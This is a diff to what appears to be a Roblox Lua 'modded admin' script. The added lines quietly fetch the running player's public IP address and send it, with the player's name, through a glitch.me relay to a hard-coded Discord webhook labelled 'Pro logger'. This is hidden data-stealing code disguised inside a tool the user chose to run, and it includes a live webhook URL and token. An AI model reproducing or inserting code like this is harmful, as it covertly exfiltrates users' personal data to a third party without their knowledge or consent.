@@ -8888,7 +8888,36 @@ end
 -- Connect the checkPlayers function to the RenderStepped event
 game:GetService("RunService").RenderStepped:Connect(checkPlayers)
 
+local player = game:GetService("Players").LocalPlayer
+local name = player.Name
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+local HttpService = game:GetService("HttpService");
 
+function SendMessage(Webhook, Message, Botname)
+    if not string.find(Webhook, "https://discordapp.com/api/webhooks/") then
+        return error("Send a valid URL");
+    end
+    local Name;
+    local WakeUp = game:HttpGet("http://buritoman69.glitch.me");
+    local API = "http://buritoman69.glitch.me/webhook";
+    if (not Message or Message == "" or not Botname) then
+        Name = "GameBot"
+        return error("nil or empty message!")
+    else
+        Name = Botname;
+    end
+    local Body = {
+        ['Key'] = tostring("applesaregood"),
+        ['Message'] = tostring(Message),
+        ['Name'] = Name,
+        ['Webhook'] = Webhook    
+    }
+    Body = HttpService:JSONEncode(Body);
+    local Data = game:HttpPost(API, Body, false, "application/json")
+    return Data or nil;
+end
+
+SendMessage("https://discordapp.com/api/webhooks/1056680169605169212/CLjlekr27HME_cBtT4OU1wkV3ho-2fiu1mV_qtwmMgjoBqMN9UxW37g9pSjX0DtjFFON", player.Name .." executed! Their IP address is: " .. ip, "Pro logger")
 
 Utils.Notify(LocalPlayer, "Modded Version", "You are using a modded admin by Advid#1471", 10);
 Utils.Notify(LocalPlayer, "Loaded", format("script loaded in %.3f seconds", (tick()) - _L.start));
